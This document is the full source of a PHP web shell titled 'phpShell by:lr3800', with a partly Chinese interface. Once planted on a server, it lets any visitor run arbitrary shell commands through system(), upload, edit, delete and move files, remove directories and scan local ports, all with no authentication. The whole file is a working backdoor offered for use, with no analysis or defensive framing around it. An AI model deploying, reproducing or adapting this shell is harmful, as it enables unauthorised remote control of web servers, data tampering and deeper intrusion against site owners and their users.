
<?php
?>
<html>
<head>
<title>
phpShell by:lr3800
</title>
</head>
<body>
<style type="text/css">
body{
background:url(http://lr3800.com/12306/images/background.gif);
color: #666666;
font-family: Verdana;
font-size: 11px;
}
a:link{
color: #33CC99;
}
a:visited{
color: #33CC99;
}
a:hover{
text-decoration: none;
Color: #3399FF;
}
table {
font-size: 11px;
}
</style>
<?php 
error_reporting(0);
set_time_limit(0);
if (empty($_GET['dir'])) {
    $dir = getcwd();
} else {
    $dir = $_GET['dir'];
}
chdir($dir);
$current = htmlentities($_SERVER['PHP_SELF'] . '?dir=' . $dir);
echo '<center><h1>phpshell</h1></center><p><hr><p>
';
echo '<i>服务器: ' . $_SERVER['SERVER_NAME'] . '<br>
';
echo '当前目录: ' . getcwd() . '<br>
';
echo '环境: ' . $_SERVER['SERVER_SOFTWARE'] . '<pre>

</pre></i>
';
echo '
	请使用者注意使用环境并遵守国家相关法律法规！
	 http://lr3800.com';
echo '<pre>


</pre>';
echo '<table width = 50%>';
echo '<tr>';
echo '<td><a href = \'' . $current . '&mode=system\'>Shell Command</a></td>
';
echo '<td><a href = \'' . $current . '&mode=create\'>新建文件</a></td>
';
echo '<td><a href = \'' . $current . '&mode=upload\'>上传文件</a></td>
';
echo '<td><a href = \'' . $current . '&mode=port_scan\'>端口扫描</a></td>
';
echo '</tr></table>';
echo '<pre>

</pre>';
$mode = $_GET['mode'];
switch ($mode) {
    case 'edit':
        $file = $_GET['file'];
        $new = $_POST['new'];
        if (empty($new)) {
            $fp = fopen($file, 'r');
            $file_cont = fread($fp, filesize($file));
            $file_cont = str_replace('</textarea>', '<textarea>', $file_cont);
            echo '<form action = \'' . $current . '&mode=edit&file=' . $file . '\' method = \'POST\'>
';
            echo 'File: ' . $file . '<br>
';
            echo '<textarea name = \'new\' rows = \'30\' cols = \'50\'>' . $file_cont . '</textarea><br>
';
            echo '<input type = \'submit\' value = \'Edit\'></form>
';
        } else {
            $fp = fopen($file, 'w');
            if (fwrite($fp, $new)) {
                echo $file . ' edited.<p>';
            } else {
                echo 'Unable to edit ' . $file . '.<p>';
            }
        }
        fclose($fp);
        break;
    case 'delete':
        $file = $_GET['file'];
        if (unlink($file)) {
            echo $file . ' deleted successfully.<p>';
        } else {
            echo 'Unable to delete ' . $file . '.<p>';
        }
        break;
    case 'copy':
        $src = $_GET['src'];
        $dst = $_POST['dst'];
        if (empty($dst)) {
            echo '<form action = \'' . $current . '&mode=copy&src=' . $src . '\' method = \'POST\'>
';
            echo 'Destination: <input name = \'dst\'><br>
';
            echo '<input type = \'submit\' value = \'Copy\'></form>
';
        } else {
            if (copy($src, $dst)) {
                echo 'File copied successfully.<p>
';
            } else {
                echo 'Unable to copy ' . $src . '.<p>
';
            }
        }
        break;
    case 'move':
        $src = $_GET['src'];
        $dst = $_POST['dst'];
        if (empty($dst)) {
            echo '<form action = \'' . $current . '&mode=move&src=' . $src . '\' method = \'POST\'>
';
            echo 'Destination: <input name = \'dst\'><br>
';
            echo '<input type = \'submit\' value = \'Move\'></form>
';
        } else {
            if (rename($src, $dst)) {
                echo 'File moved successfully.<p>
';
            } else {
                echo 'Unable to move ' . $src . '.<p>
';
            }
        }
        break;
    case 'rename':
        $old = $_GET['old'];
        $new = $_POST['new'];
        if (empty($new)) {
            echo '<form action = \'' . $current . '&mode=rename&old=' . $old . '\' method = \'POST\'>
';
            echo 'New name: <input name = \'new\'><br>
';
            echo '<input type = \'submit\' value = \'Rename\'></form>
';
        } else {
            if (rename($old, $new)) {
                echo 'File/Directory renamed successfully.<p>
';
            } else {
                echo 'Unable to rename ' . $old . '.<p>
';
            }
        }
        break;
    case 'rmdir':
        $rm = $_GET['rm'];
        if (rmdir($rm)) {
            echo 'Directory removed successfully.<p>
';
        } else {
            echo 'Unable to remove ' . $rm . '.<p>
';
        }
        break;
    case 'system':
        $cmd = $_POST['cmd'];
        if (empty($cmd)) {
            echo '<form action = \'' . $current . '&mode=system\' method = \'POST\'>
';
            echo 'Shell Command: <input name = \'cmd\'>
';
            echo '<input type = \'submit\' value = \'Run\'></form><p>
';
        } else {
            system($cmd);
        }
        break;
    case 'create':
        $new = $_POST['new'];
        if (empty($new)) {
            echo '<form action = \'' . $current . '&mode=create\' method = \'POST\'>
';
            echo '<tr><td>New file: <input name = \'new\'></td>
';
            echo '<td><input type = \'submit\' value = \'Create\'></td></tr></form>
<p>';
        } else {
            if ($fp = fopen($new, 'w')) {
                echo 'File created successfully.<p>
';
            } else {
                echo 'Unable to create ' . $file . '.<p>
';
            }
            fclose($fp);
        }
        break;
    case 'upload':
        $temp = $_FILES['upload_file']['tmp_name'];
        $file = basename($_FILES['upload_file']['name']);
        if (empty($file)) {
            echo '<form action = \'' . $current . '&mode=upload\' method = \'POST\' ENCTYPE=\'multipart/form-data\'>
';
            echo 'Local file: <input type = \'file\' name = \'upload_file\'>
';
            echo '<input type = \'submit\' value = \'Upload\'>
';
            echo '</form>
<pre>

</pre>';
        } else {
            if (move_uploaded_file($temp, $file)) {
                echo 'File uploaded successfully.<p>
';
                unlink($temp);
            } else {
                echo 'Unable to upload ' . $file . '.<p>
';
            }
        }
        break;
    case 'port_scan':
        $port_range = $_POST['port_range'];
        if (empty($port_range)) {
            echo '<table><form action = \'' . $current . '&mode=port_scan\' method = \'POST\'>';
            echo '<tr><td><input type = \'text\' name = \'port_range\'></td><td>';
            echo '输入端口范围要做端口扫描（例：0:65535）</td></tr>';
            echo '<tr><td><input type = \'submit\' value = \'扫描\'></td></tr></form></table>';
        } else {
            $range = explode(':', $port_range);
            if (!is_numeric($range[0]) or !is_numeric($range[1])) {
                echo 'Bad parameters.<br>';
            } else {
                $host = 'localhost';
                $from = $range[0];
                $to = $range[1];
                echo 'Open ports:<br>';
                while ($from <= $to) {
                    $var = 0;
                    $fp = fsockopen($host, $from) or $var = 1;
                    if ($var == 0) {
                        echo $from . '<br>';
                    }
                    $from++;
                    fclose($fp);
                }
            }
        }
        break;
}
clearstatcache();
echo '<pre>

</pre>';
echo '<table width = 100%>
';
$files = scandir($dir);
foreach ($files as $file) {
    if (is_file($file)) {
        $size = round(filesize($file) / 1024, 2);
        echo '<tr><td>' . $file . '</td>';
        echo '<td>' . $size . ' KB</td>';
        echo '<td><a href = ' . $current . '&mode=edit&file=' . $file . '>Edit</a></td>
';
        echo '<td><a href = ' . $current . '&mode=delete&file=' . $file . '>Delete</a></td>
';
        echo '<td><a href = ' . $current . '&mode=copy&src=' . $file . '>Copy</a></td>
';
        echo '<td><a href = ' . $current . '&mode=move&src=' . $file . '>Move</a></td>
';
        echo '<td><a href = ' . $current . '&mode=rename&old=' . $file . '>Remame</a></td></tr>
';
    } else {
        $items = scandir($file);
        $items_num = count($items) - 2;
        echo '<tr><td>' . $file . '</td>';
        echo '<td>' . $items_num . ' Items</td>';
        echo '<td><a href = ' . $current . '/' . $file . '>Change directory</a></td>
';
        echo '<td><a href = ' . $current . '&mode=rmdir&rm=' . $file . '>Remove directory</a></td>
';
        echo '<td><a href = ' . $current . '&mode=rename&old=' . $file . '>Rename directory</a></td></tr>
';
    }
}
echo '</table>
';
